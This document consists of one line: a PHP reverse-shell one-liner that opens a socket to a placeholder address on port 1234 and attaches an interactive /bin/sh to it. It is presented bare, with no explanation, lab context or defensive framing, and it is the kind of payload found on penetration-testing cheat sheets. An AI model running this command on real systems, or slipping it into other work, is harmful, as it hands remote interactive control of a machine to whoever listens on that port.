php -r '$sock=fsockopen("0.0.0.0",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
